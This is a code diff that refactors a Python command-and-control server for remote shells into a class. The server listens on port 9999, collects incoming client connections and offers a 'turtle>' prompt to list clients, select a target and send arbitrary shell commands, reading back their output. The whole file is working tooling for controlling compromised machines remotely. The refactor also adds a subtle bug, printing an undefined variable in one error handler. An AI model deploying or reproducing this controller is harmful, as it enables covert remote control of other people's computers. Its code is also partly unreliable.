@@ -1,177 +1,215 @@
 import socket
 import threading
 import time
+import sys
 from queue import Queue
 import struct
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
-all_connections = []
-all_addresses = []
 
+class MultiServer(object):
+  '''
+  '''
 
-# Create socket (allows two computers to connect)
-def socket_create():
+  def __init__(self):
+    '''
+    '''
+    self.host = ''
+    self.port = 9999
+    self.socket  = None
+    self.all_connections = []
+    self.all_addresses = []
+
+  def socket_create(self):
+    '''
+    '''
     try:
-        global host
-        global port
-        global s
-        host = ''
-        port = 9999
-        s = socket.socket()
-    except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+      self.socket = socket.socket()
+    except socket.error as e:
+      print("Socket creation error: " + str(msg))
+      # TODO: Added exit 
+      sys.exit(1)
 
-
-# Bind socket to port and wait for connection from client
-def socket_bind():
+  def socket_bind(self):
+    '''
+Bind socket to port and wait for connection from client
+    '''
     try:
-        global host
-        global port
-        global s
-        s.bind((host, port))
-        s.listen(5)
-    except socket.error as msg:
-        print("Socket binding error: " + str(msg))
+      self.socket.bind((self.host, self.port))
+      self.socket.listen(5)
+    except socket.error as e:
+        print("Socket binding error: " + str(e))
         time.sleep(5)
-        socket_bind()
+        self.socket_bind()
+    return
 
-
-# Accept connections from multiple clients and save to list
-def accept_connections():
-    for c in all_connections:
-        c.close()
-    del all_connections[:]
-    del all_addresses[:]
+  def accept_connections(self):
+    '''
+Accept connections from multiple clients and save to list
+    '''
+    for c in self.all_connections:
+      c.close()
+    self.all_connections = []
+    self.all_addresses = []
     while 1:
-        try:
-            conn, address = s.accept()
-            conn.setblocking(1)
-            client_hostname = conn.recv(1024).decode("utf-8")
-            address = address + (client_hostname,)
-            all_connections.append(conn)
-            all_addresses.append(address)
-            print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
-        except:
-            print('Error accepting connections')
+      try:
+        conn, address = self.socket.accept()
+        conn.setblocking(1)
+        client_hostname = conn.recv(1024).decode("utf-8")
+        address = address + (client_hostname,)
+      except Exception as e:
+        print('Error accepting connections: %s' %str(e))
+        # Loop indefinetely
+        continue
+      self.all_connections.append(conn)
+      self.all_addresses.append(address)
+      print('\nConnection has been established: {0} ({1})'.format(address[-1], address[0]))
+    return
 
-
-# Interactive prompt for sending commands remotely
-def start_turtle():
+  def start_turtle(self):
+    '''
+Interactive prompt for sending commands remotely
+    '''
     while True:
-        cmd = input('turtle> ')
-        if cmd == 'list':
-            list_connections()
-            continue
-        elif 'select' in cmd:
-            target, conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(target, conn)
-        else:
-            print('Command not recognized')
+      cmd = input('turtle> ')
+      if cmd == 'list':
+        self.list_connections()
+        continue
+      elif 'select' in cmd:
+        target, conn = self.get_target(cmd)
+        if conn is not None:
+          self.send_target_commands(target, conn)
+      else:
+        print('Command not recognized')
+    return
 
-
-# List all connections
-def list_connections():
+  def list_connections(self):
+    '''
+List all connections
+    '''
     results = ''
-    for i, conn in enumerate(all_connections):
-        try:
-            conn.send(str.encode(' '))
-            conn.recv(20480)
-        except:
-            del all_connections[i]
-            del all_addresses[i]
-            continue
-        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '   ' + str(all_addresses[i][2]) + '\n'
+    for i, conn in enumerate(self.all_connections):
+      try:
+        conn.send(str.encode(' '))
+        conn.recv(20480)
+      except:
+        del self.all_connections[i]
+        del self.all_addresses[i]
+        continue
+      results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
     print('----- Clients -----' + '\n' + results)
+    return
 
-
-# Select a target client
-def get_target(cmd):
+  def get_target(self, cmd):
+    '''
+Select target client
+    '''
+    target = cmd.split(' ')[-1]
     try:
-        target = cmd.replace('select ', '')
-        target = int(target)
-        conn = all_connections[target]
-        print("You are now connected to " + str(all_addresses[target][2]))
-        # Address shouldn't be printed, we want cwd, instead
-        # print(str(all_addresses[target][0]) + '> ', end="")
-        return target, conn
+      target = int(target)
     except:
-        print('Not a valid selection')
-        return None
+      print('Client index should be an integer')
+      return None, None
+    try:
+      conn = self.all_connections[target]
+    except IndexError:
+      print('Not a valid selection')
+      return None, None
+    print("You are now connected to " + str(self.all_addresses[target][2]))
+    return target, conn
 
-def read_command_output(conn):
-    # Read message length and unpack it into an integer
-    raw_msglen = recvall(conn, 4)
+  def read_command_output(self, conn):
+    '''
+Read message length and unpack it into an integer
+    '''
+    raw_msglen = self.recvall(conn, 4)
     if not raw_msglen:
-        return None
+      return None
     msglen = struct.unpack('>I', raw_msglen)[0]
     # Read the message data
-    return recvall(conn, msglen)
-
-def recvall(conn, n):
-    # Helper function to recv n bytes or return None if EOF is hit
+    return self.recvall(conn, msglen)
+ 
+  def recvall(self, conn, n):
+    '''
+Helper function to recv n bytes or return None if EOF is hit
+    '''
+    #TODO: this can be a static method
     data = b''
     while len(data) < n:
-        packet = conn.recv(n - len(data))
-        if not packet:
-            return None
-        data += packet
+      packet = conn.recv(n - len(data))
+      if not packet:
+        return None
+      data += packet
     return data
 
-# Connect with remote target client
-def send_target_commands(target, conn):
-    global s
+
+  def send_target_commands(self, target, conn):
+    '''
+Connect with remote target client
+    '''
     conn.send(str.encode(" "))
-    cwd_bytes = read_command_output(conn)
+    cwd_bytes = self.read_command_output(conn)
     cwd = str(cwd_bytes, "utf-8")
     print(cwd, end="")
     while True:
-        try:
-            cmd = input()
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                cmd_output = read_command_output(conn)
-                client_response = str(cmd_output, "utf-8")
-                print(client_response, end="")
-            if cmd == 'quit':
-
-                break
-        except:
+      try:
+        cmd = input()
+        if len(str.encode(cmd)) > 0:
+          conn.send(str.encode(cmd))
+          cmd_output = self.read_command_output(conn)
+          client_response = str(cmd_output, "utf-8")
+          print(client_response, end="")
+        if cmd == 'quit':
+          break
+      except:
             print("Connection was lost")
             break
-    del all_connections[target]
-    del all_addresses[target]
+    del self.all_connections[target]
+    del self.all_addresses[target]
+    return
 
-
-# Create worker threads (will die when main exits)
 def create_workers():
-    for _ in range(NUMBER_OF_THREADS):
-        t = threading.Thread(target=work)
+  '''
+Create worker threads (will die when main exits)
+  '''
+  server = MultiServer()
+  for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work, args=(server,))
         t.daemon = True
         t.start()
+  return
 
 
-# Do the next job in the queue (thread for handling connections, another for sending commands)
-def work():
-    while True:
-        x = queue.get()
-        if x == 1:
-            socket_create()
-            socket_bind()
-            accept_connections()
-        if x == 2:
-            start_turtle()
-        queue.task_done()
+def work(server):
+  '''
+Do the next job in the queue (thread for handling connections, another for sending commands)
+  '''
+  while True:
+    x = queue.get()
+    if x == 1:
+      server.socket_create()
+      server.socket_bind()
+      server.accept_connections()
+    if x == 2:
+      server.start_turtle()
+    queue.task_done()
+  return
 
-
-# Each list item is a new job
 def create_jobs():
-    for x in JOB_NUMBER:
-        queue.put(x)
-    queue.join()
+  '''
+Each list item is a new job
+  '''
+  for x in JOB_NUMBER:
+    queue.put(x)
+  queue.join()
 
+def main():
+  '''
+  '''
+  create_workers()
+  create_jobs()
 
-create_workers()
-create_jobs()
+if __name__ == '__main__':
+  main()
